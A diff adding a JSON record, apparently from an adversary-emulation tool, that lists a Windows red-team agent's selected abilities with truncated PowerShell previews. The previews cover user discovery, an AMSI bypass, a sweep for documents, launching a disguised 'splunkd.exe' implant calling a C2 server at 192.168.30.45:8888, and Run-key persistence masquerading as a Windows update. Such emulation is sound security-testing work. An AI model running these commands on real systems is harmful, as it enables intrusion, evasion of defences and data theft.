@@ -1,0 +1,55 @@
+{
+  "selected_agent": {
+    "paw": "rjgyoy",
+    "group": "red",
+    "platform": "windows"
+  },
+  "selected_adversary_id": "6308830d-3d43-4e01-9057-1a63a25d0b74",
+  "operation_adversary_id": "temp-seed-rjgyoy-1775119101",
+  "compatible_count": 5,
+  "referenced_ability_count": 5,
+  "selected_abilities": [
+    {
+      "ability_id": "discovery_users",
+      "name": "User Discovery",
+      "tactic": "discovery",
+      "technique_id": "T1033",
+      "noisy_score": 7,
+      "command_preview": "whoami; whoami /priv; net user; net localgroup administrators"
+    },
+    {
+      "ability_id": "amsi_bypass",
+      "name": "AMSI Bypass",
+      "tactic": "defense-evasion",
+      "technique_id": "T1562.001",
+      "noisy_score": 1,
+      "command_preview": "$s=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils'); $f=$s.GetField('amsiInitFailed…"
+    },
+    {
+      "ability_id": "collection_files",
+      "name": "Sensitive File Discovery",
+      "tactic": "collection",
+      "technique_id": "T1005",
+      "noisy_score": 1,
+      "command_preview": "Get-ChildItem C:\\Users -Recurse -Include *.docx,*.pdf,*.txt -ErrorAction SilentlyContinue | Select-…"
+    },
+    {
+      "ability_id": "c2_internal",
+      "name": "Internal C2",
+      "tactic": "command-and-control",
+      "technique_id": "T1071.001",
+      "noisy_score": 0,
+      "command_preview": "Start-Process C:\\Users\\Public\\splunkd.exe ` -ArgumentList \"-server http://192.168.30.45:8888 -group…"
+    },
+    {
+      "ability_id": "persistence_registry",
+      "name": "Registry Persistence",
+      "tactic": "persistence",
+      "technique_id": "T1547.001",
+      "noisy_score": 0,
+      "command_preview": "New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" ` -Name \"WindowsUpdate…"
+    }
+  ],
+  "temp_adversary_saved": true,
+  "temp_adversary_error": null
+}
